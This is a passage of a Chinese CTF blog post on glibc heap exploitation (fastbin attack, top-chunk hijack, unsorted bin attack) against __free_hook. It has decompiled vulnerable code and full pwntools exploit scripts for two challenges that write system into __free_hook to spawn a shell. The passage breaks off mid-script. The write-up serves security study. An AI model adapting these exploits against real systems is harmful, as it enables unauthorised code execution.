<p>那么就可以通过修改<code>main_arena</code>中的<code>top</code>为<code>__free_hook</code>的上方某个区域（该区域存在足够大的数据以充当size字段），然后通过不断地从top chunk分配内存空间直到可以写到<code>__free_hook</code>中去。<br><br>但是观察<code>main_arena</code>上方可以发现，并不能直接利用fastbin attack分配到可以写<code>top</code>的地址空间：<br><img src="/2020/04/15/Fastbin-attack-%E5%B0%8F%E7%BB%93/main_arena.png" alt><br>那么这里还需要多利用一次fastbin attack，在<code>top</code>的上方进行fastbin attack写入size来供后续的fastbin attack改写<code>top</code>。<br><br>还有一个问题，把top chunk改到哪里，经调试发现，在<code>__free_hook-0xb58</code>的位置发现一个足够大的值（随机的）可作为top chunk的size（不知道不同版本的Glibc会不会有差异，这里测试的Glibc 2.23和Gblic 2.27都符合情况）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gef➤  p &amp;__free_hook</span><br><span class="line">$2 &#x3D; (void (**)(void *, const void *)) 0x7ffff7dd18e8 &lt;__free_hook&gt;</span><br><span class="line">gef➤  tele 0x7ffff7dd18e8-0xb58</span><br><span class="line">0x00007ffff7dd0d90│+0x0000: 0x0000000000000004</span><br><span class="line">0x00007ffff7dd0d98│+0x0008: 0x9aa83c6e1b4e13d1</span><br><span class="line">0x00007ffff7dd0da0│+0x0010: 0x0000000000000000</span><br><span class="line">0x00007ffff7dd0da8│+0x0018: 0x0000000000000000</span><br><span class="line">0x00007ffff7dd0db0│+0x0020: 0x0000000000000000</span><br><span class="line">0x00007ffff7dd0db8│+0x0028: 0x0000000000000000</span><br><span class="line">0x00007ffff7dd0dc0│+0x0030: 0x0000000000000000</span><br><span class="line">0x00007ffff7dd0dc8│+0x0038: 0x0000000000000000</span><br><span class="line">0x00007ffff7dd0dd0│+0x0040: 0x0000000000000000</span><br><span class="line">0x00007ffff7dd0dd8│+0x0048: 0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>这样就可以劫持top chunk，然后不断地malloc，直到往<code>__free_hook</code>写入<code>system</code>的地址，最后<code>free</code>一个写有”/bin/sh”的堆块就可以geshell了。</p>
<h3 id="举例-2"><a href="#举例-2" class="headerlink" title="举例"></a>举例</h3><h4 id="CISCN-2019-华东北赛区-Pwn-pwn4"><a href="#CISCN-2019-华东北赛区-Pwn-pwn4" class="headerlink" title="CISCN-2019-华东北赛区-Pwn-pwn4"></a>CISCN-2019-华东北赛区-Pwn-pwn4</h4><p><code>edit</code>功能的<code>getsize</code>提供了一个字节溢出，可以off by one造成chunk overlap从而造成uaf：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">    <span class="keyword">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"index: "</span>);</span><br><span class="line">    v2 = choice(v1);</span><br><span class="line">    v3 = v2;</span><br><span class="line">    <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> &amp;&amp; v2 &lt;= <span class="number">15</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v2 = *((_DWORD *)&amp;chunk_status + <span class="number">4</span> * v2);</span><br><span class="line">        <span class="keyword">if</span> ( v2 == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"size: "</span>);</span><br><span class="line">            v2 = choice(<span class="number">1</span>);</span><br><span class="line">            v4 = get_size(*((_DWORD *)&amp;chunk_size + <span class="number">4</span> * v3), v2);</span><br><span class="line">            <span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"content: "</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v2);</span><br><span class="line">                v2 = read_data(chunk_array[<span class="number">2</span> * v3], v4);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __<span class="function">fastcall <span class="title">get_size</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( a1 &gt; (<span class="keyword">signed</span> <span class="keyword">int</span>)a2 )</span><br><span class="line">        <span class="keyword">return</span> a2;</span><br><span class="line">    <span class="keyword">if</span> ( a2 - a1 == <span class="number">10</span> )</span><br><span class="line">        LODWORD(result) = a1 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        LODWORD(result) = a1;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>add</code>功能限制最大的内存分配空间是0x100，还有一个需要注意的点，<code>add</code>功能是用<code>calloc</code>来分配内存空间的，<code>calloc</code>分配内存会事先清空内存区域，同时<b>不会从tcache中取chunk</b>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 result; <span class="comment">// rax</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">    <span class="keyword">int</span> v2; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">    <span class="keyword">void</span> *v4; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        result = *((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)&amp;chunk_status + <span class="number">4</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)i);</span><br><span class="line">        <span class="keyword">if</span> ( !(_DWORD)result )</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"size: "</span>);</span><br><span class="line">        v3 = choice(v2);</span><br><span class="line">        <span class="keyword">if</span> ( v3 &gt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ( v3 &gt; <span class="number">4096</span> )</span><br><span class="line">            v3 = <span class="number">4096</span>;</span><br><span class="line">            v4 = <span class="built_in">calloc</span>(v3, <span class="number">1u</span>LL);</span><br><span class="line">            <span class="keyword">if</span> ( !v4 )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">            *((_DWORD *)&amp;chunk_status + <span class="number">4</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)i) = <span class="number">1</span>;</span><br><span class="line">            *((_DWORD *)&amp;chunk_size + <span class="number">4</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)i) = v3;</span><br><span class="line">            chunk_array[<span class="number">2</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)i] = v4;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"The lowbits of heap leak check : %x\n"</span>, chunk_array[<span class="number">2</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)i] &amp; <span class="number">0xFFF</span>LL);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"the index of ticket is %d \n"</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br>主要思路就是：</p>
<ol>
<li>其实题目没有给libc，这里之所以能知道有tcache是因为<code>add</code>给了chunk的低三个字节，可以明显看出在堆地址的开头是有分配0x250字节的tcache struct的。</li>
<li>事先分配释放7个<code>size=0x71</code>的chunk以填满tcache，之后才能将相应的chunk放入fastbin中实现fastbin attack。</li>
<li>再利用<code>edit</code>功能的off by one，形成chunk overlap，修改下一个chunk的size来创造unsorted bin从而leak libc地址。</li>
<li>利用chunk overlap形成uaf，实现fastbin attack将<code>main_arena</code>的<code>top</code>上方布置好size，注意我分配的空间是包含了<code>__malloc_hook</code>的，所以要保持其为<code>NULL</code></li>
<li>再利用fastbin attack改掉<code>top</code>为<code>__free_hook-0xb58</code>，因为不太清楚<code>main_arena</code>中其他结构体信息会不会造成其他位置影响，所以其他地方尽量保持不动</li>
<li>不断地申请释放空间（由于chunk的数量有限制），这里其实还是利用了<code>calloc</code>不会分配tcache的特性，注意一个tcache bin被填满后一定要换一个tcache bin，否则刚free出来的chunk会放进fastbin中，再次分配不会从top chunk切。</li>
<li>分配到<code>__free_hook</code>上方时，将<code>system</code>写入<code>__free_hook</code>，注意<code>__free_hook</code>上方有些位置不能写入内容（有待深入了解），因为在调试的过程中发现，若某些位置被填入数据会陷入<code>__lll_lock_wait_private</code>造成死锁状态，所以其他位置用”\x00”填充就好了。</li>
<li>之后<code>free</code>一个包含”/bin/sh”的chunk就能触发`system(“/bin/sh”)”了。<br>我的完整exp如下：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"CHOICE: "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"size: "</span>, str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"The lowbits of heap leak check : "</span>)</span><br><span class="line">    <span class="keyword">return</span> p.recv(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"CHOICE: "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"size: "</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"CHOICE: "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(index, label=<span class="string">""</span>)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"CHOICE: "</span>, <span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>, str(index))</span><br><span class="line">    <span class="keyword">if</span> label != <span class="string">""</span>:</span><br><span class="line">        p.recvuntil(label)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.recvuntil(<span class="string">"content: "</span>)</span><br><span class="line"></span><br><span class="line">unsorted_bin_offset = <span class="number">0x60</span></span><br><span class="line">main_arena_offset = <span class="number">0x3ebc40</span></span><br><span class="line">__malloc_hook_offset = <span class="number">0x3ebc30</span></span><br><span class="line">__free_hook_offset = <span class="number">0x3ed8e8</span></span><br><span class="line">realloc_offset = <span class="number">0x98c30</span></span><br><span class="line">system_offset = <span class="number">0x4f440</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    chunk = add(<span class="number">0x68</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">chunk_0 = add(<span class="number">0x58</span>)</span><br><span class="line">chunk_0 = int(chunk_0, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">chunk_1 = add(<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin</span></span><br><span class="line">chunk_2 = add(<span class="number">0xF8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite size</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x58</span> + <span class="number">10</span>, <span class="string">"A"</span> * <span class="number">0x58</span> + <span class="string">"\x71"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># create unsorted bin</span></span><br><span class="line">edit(<span class="number">2</span>, <span class="number">0x50</span>, <span class="string">"A"</span> * <span class="number">0x40</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">chunk_1 = add(<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="number">0x20</span>, <span class="string">"B"</span> * <span class="number">0x18</span> + p64(<span class="number">0x501</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leave enough space</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    chunk_3 = add(<span class="number">0xF8</span>)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># free unsorted bin</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">view(<span class="number">1</span>, p64(<span class="number">0x501</span>))</span><br><span class="line">main_arena = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">libc_base = main_arena - unsorted_bin_offset - main_arena_offset</span><br><span class="line">__malloc_hook = libc_base + __malloc_hook_offset</span><br><span class="line">__free_hook = libc_base + __free_hook_offset</span><br><span class="line">libc_realloc = libc_base + realloc_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk_overlap + uaf</span></span><br><span class="line">chunk_2 = add(<span class="number">0x58</span>)</span><br><span class="line">chunk_3 = add(<span class="number">0x58</span>)</span><br><span class="line">chunk_4 = add(<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">2</span>, <span class="number">0x58</span> + <span class="number">10</span>, <span class="string">"D"</span> * <span class="number">0x58</span> + <span class="string">"\x71"</span>)</span><br><span class="line">edit(<span class="number">4</span>, <span class="number">0x10</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">chunk_3 = add(<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">3</span>, <span class="number">0x60</span>, <span class="string">"E"</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">3</span>, <span class="number">0x68</span>, <span class="string">"E"</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(__malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">chunk_4 = add(<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># create size area for malloc fastbin over main_arena-&gt;top_chunk</span></span><br><span class="line">chunk_5 = add(<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">5</span>, <span class="number">0x33</span>, <span class="string">"F"</span> * <span class="number">0x13</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) * <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># uaf again</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">3</span>, <span class="number">0x68</span>, <span class="string">"E"</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(__malloc_hook))</span><br><span class="line">chunk_4 = add(<span class="number">0x68</span>)</span><br><span class="line">chunk_6 = add(<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">6</span>, <span class="number">0x68</span>, <span class="string">"\x00"</span> * <span class="number">0x60</span> + p64(__free_hook - <span class="number">0xb58</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># use unsorted bin</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    chunk_7 = add(<span class="number">0x100</span>)</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    chunk_7 = add(<span class="number">0xE8</span>)</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write __free_hook</span></span><br><span class="line">chunk_7 = add(<span class="number">0xE8</span>)</span><br><span class="line">edit(<span class="number">7</span>, <span class="number">0x80</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">"\x00"</span> * <span class="number">0x70</span> + p64(libc_system))</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger __free_hook</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"main_arena: "</span> + hex(main_arena))</span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"__malloc_hook: "</span> + hex(__malloc_hook))</span><br><span class="line">success(<span class="string">"__free_hook: "</span> + hex(__free_hook))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h2 id="unsorted-bin-attack-to-create-size-over-free-hook"><a href="#unsorted-bin-attack-to-create-size-over-free-hook" class="headerlink" title="unsorted bin attack to create size over __free_hook"></a>unsorted bin attack to create size over __free_hook</h2><p>同样是打<code>__free_hook</code>，只不过这次是用fastbin attack，通过unsorted bin attack在<code>__free_hook</code>上方伪造size提供给fastbin attack进行利用。</p>
<h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>unsorted bin attack的攻击原理这里就不再二次赘述了，可参考<a href="https://n0nop.com/2020/04/09/pwn-heap-BookWriter/#unsorted-bin-attack">BookWriter</a>。<br><br>只是有一点需要注意，由于进行了unsorted bin attack之后，还需要保持程序的正常运行进行后续利用，所以要保证不能再出现存取unsorted bin的情况（此时unsorted bin链表已经损坏），因此要保证进行unsorted bin attack时，<code>malloc</code>申请的大小要正好等于<code>unsorted bin</code>的大小，否则会有一个unsorted bin切割后重新入链的操作，从而使程序crash掉。<br><br>同时，若unsorted bin的size是伪造的，注意该size同样必须满足unsorted bin的size约束，否则同样会crash。</p>
<h3 id="举例-3"><a href="#举例-3" class="headerlink" title="举例"></a>举例</h3><h4 id="Secret-Of-My-Heart"><a href="#Secret-Of-My-Heart" class="headerlink" title="Secret Of My Heart"></a>Secret Of My Heart</h4><p><code>add</code>功能中<code>set_data</code>存在明显的off by null漏洞：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">    <span class="keyword">size_t</span> v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( i &gt; <span class="number">99</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Fulled !!"</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !*(_QWORD *)(chunk_array + <span class="number">0x30</span>LL * i + <span class="number">0x28</span>) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Size of heart : "</span>);</span><br><span class="line">    v2 = (<span class="keyword">signed</span> <span class="keyword">int</span>)choice();</span><br><span class="line">    <span class="keyword">if</span> ( v2 &gt; <span class="number">0x100</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Too big !"</span>);</span><br><span class="line">    set_data((<span class="keyword">size_t</span> *)(chunk_array + <span class="number">48L</span>L * i), v2);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done !"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_BYTE *__<span class="function">fastcall <span class="title">set_data</span><span class="params">(<span class="keyword">size_t</span> *a1, <span class="keyword">size_t</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _BYTE *result; <span class="comment">// rax</span></span><br><span class="line">    <span class="keyword">size_t</span> <span class="built_in">size</span>; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">    *a1 = a2;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Name of heart :"</span>, a2);</span><br><span class="line">    read_data(a1 + <span class="number">1</span>, <span class="number">0x20</span>u);</span><br><span class="line">    a1[<span class="number">5</span>] = (<span class="keyword">size_t</span>)<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !a1[<span class="number">5</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Allocate Error !"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"secret of my heart :"</span>, <span class="number">32L</span>L);</span><br><span class="line">    result = (_BYTE *)(a1[<span class="number">5</span>] + (<span class="keyword">signed</span> <span class="keyword">int</span>)read_data((<span class="keyword">void</span> *)a1[<span class="number">5</span>], <span class="built_in">size</span>));</span><br><span class="line">    *result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主要利用思路：</p>
<ol>
<li>利用<code>add</code>中的off by null，触发unsorted bin的unlink形成chunk overlap。</li>
<li>利用chunk overlap先leak出libc的地址。</li>
<li>通过unsorted bin attack将<code>__free_hook-0x50-0x10</code>处写入<code>main_arena</code>的地址。</li>
<li>将<code>__free_hook-0x50-0x10</code>处写入的<code>main_arena</code>的地址的高字节<code>0x7F</code>作为size，进行fastbin attack，将<code>system</code>写入<code>__free_hook</code>。</li>
<li>free一个包含”/bin/sh”的chunk，getshell（本地没打通，远程打通了，有点奇怪）。<br>我的exp：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, name, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Size of heart : "</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"Name of heart :"</span>, name)</span><br><span class="line">    p.sendafter(<span class="string">"secret of my heart :"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(index, label)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index :"</span>, str(index))</span><br><span class="line">    p.recvuntil(label)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index :"</span>, str(index))</span><br><span class="line"></span><br><span class="line">unsorted_bin_offset = <span class="number">0x58</span></span><br><span class="line">main_arena_offset = <span class="number">0x3c3b20</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">__free_hook_offset = libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line"><span class="comment"># realloc_offset = libc.symbols["realloc"]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># unlink and chunk overlap</span></span><br><span class="line">add(<span class="number">0xF8</span>, <span class="string">"AAAA"</span>, <span class="string">"AAAA"</span>) <span class="comment"># chunk 0</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"BBBB"</span>, <span class="string">"BBBB"</span>) <span class="comment"># chunk 1</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"CCCC"</span>, <span class="string">"CCCC"</span>) <span class="comment"># chunk 2</span></span><br><span class="line">add(<span class="number">0xF8</span>, <span class="string">"DDDD"</span>, <span class="string">"DDDD"</span>) <span class="comment"># chunk 3</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"EEEE"</span>, <span class="string">"EEEE"</span>) <span class="comment"># chunk 4</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"CCCC"</span>, <span class="string">"C"</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0x180</span>)) <span class="comment"># chunk 2</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">add(<span class="number">0xF8</span>, <span class="string">"AAAA"</span>, <span class="string">"AAAA"</span>) <span class="comment"># chunk 0</span></span><br><span class="line">view(<span class="number">1</span>, <span class="string">"Secret : "</span>)</span><br><span class="line">main_arena = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">libc_base = main_arena - unsorted_bin_offset - main_arena_offset</span><br><span class="line">__free_hook = libc_base + __free_hook_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># recover the unsorted bin</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk overlap</span></span><br><span class="line">add(<span class="number">0xE8</span>, <span class="string">"AAAA"</span>, <span class="string">"AAAA"</span>) <span class="comment"># chunk 0</span></span><br><span class="line">add(<span class="number">0xF8</span>, <span class="string">"DDDD"</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x61</span>) + <span class="string">"D"</span> * <span class="number">0x58</span> + p64(<span class="number">0x21</span>)) <span class="comment"># chunk 3</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk overlap again</span></span><br><span class="line">add(<span class="number">0xF8</span>, <span class="string">"BBBB"</span>, <span class="string">"B"</span> * <span class="number">0x48</span> + p64(<span class="number">0x71</span>) + <span class="string">"B"</span> * <span class="number">0x68</span> + p64(<span class="number">0x21</span>)) <span class="comment"># chunk 1</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin attack</span></span><br><span class="line">add(<span class="number">0x98</span>, <span class="string">"BBBB"</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x61</span>) + <span class="string">"B"</span> * <span class="number">0x30</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)) <span class="comment"># chunk 1</span></span><br><span class="line">add(<span class="number">0x58</span>, <span class="string">"CCCC"</span>, <span class="string">"\x00"</span> * <span class="number">0x30</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(__free_hook - <span class="number">0x43</span>)) <span class="comment"># chunk 2</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"DDDD"</span>, <span class="string">"\x00"</span> * <span class="number">0x40</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xA1</span>) + p64(main_arena) + p64(__free_hook - <span class="number">0x50</span>)) <span class="comment"># chunk 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger unsorted bin attack</span></span><br><span class="line">add(<span class="number">0x98</span>, <span class="string">"EEEE"</span>, <span class="string">"EEEE"</span>) <span class="comment"># chunk 4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write __free_hook</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"FFFF"</span>, <span class="string">"\x00"</span> * <span class="number">0x33</span> + p64(libc_system)) <span class="comment"># chunk 5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger __free_hook</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"GGGG"</span>, <span class="string">"/bin/sh\x00"</span>) <span class="comment"># chunk 6</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + 